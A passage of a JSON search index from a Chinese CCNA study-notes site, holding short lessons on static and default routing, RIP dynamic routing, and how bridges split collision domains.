"},"韩立刚CCNA/静态路由.html":{"url":"韩立刚CCNA/静态路由.html","title":"静态路由","keywords":"","body":"静态路由 网络畅通的条件： 数据包能去能回 沿途的路由器必选知道到目标地址如何转发 沿途的路由器必选知道 回来的数据包如何转发 路由器直连的网络，不用告诉路由器如何转发 路由器没有直连的网络，管理员需要告诉路由器到目标网络如何转发（也就是添加静态路由） 路由汇总：即超网 Windows上添加路由表 添加路由表route add 0.0.0.0 mask 0.0.0.0 192.168.31.1 显示路由表route print 或 netstat -r 默认路由 网络地址和子网掩码都为0，如图所示配置，这就意味着到任何网络下一跳转发给10.0.0.2。 网络地址和子网掩码均为0的路由就是默认路由。 Router（config）#ip route 0.0.0.0 0.0.0.0 10.0.0.2 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:34 "},"韩立刚CCNA/动态路由.html":{"url":"韩立刚CCNA/动态路由.html","title":"动态路由","keywords":"","body":"动态路由 静态路由不会随着网络链路状态的变化自动选择最佳路径，网络中增加或修改了网段，都需要人工调整网络中路由器的路由表。 RIP协议 使用“跳数”来衡量到达目标地址的路由距离 30秒广播路由表 最大跳数16跳 EIGRP协议的优先级比RIP协议高 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:34 "},"韩立刚CCNA/交换机.html":{"url":"韩立刚CCNA/交换机.html","title":"交换机","keywords":"","body":"交换机 在两个集线器之间连接一个网桥，网桥能够基于MAC地址表转发数据。如图所示，网桥有两个以太网接口E0和E1，并且知道E0对应哪些MAC地址，E1对应哪些MAC地址。当A计算机给B计算机发送一个数据帧，集线器将该数据帧扩散到所有的接口，网桥的E0接口收到该数据帧，查看目标MAC地址0260.8c01.222，该目标MAC对应E0接口，于是不转发到E1接口，这样就不影响C和D计算机的通信。 网桥将一个大的冲突域划分成两个冲突域，冲突域的数量增加了，但是冲突域减小了。网桥的一个接口就是一个冲突域。 如果网络中的计算机发送一个目标MAC地址为FFFF.FFFF.FFFF的数据帧，这样的数据帧称为广播（比如ARP协议就是使用广播解析对方MAC地址的），网桥将会将这样的帧转发到除了发送端口的所有端口。所有的端口在同一个广播域。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 14:36 "}}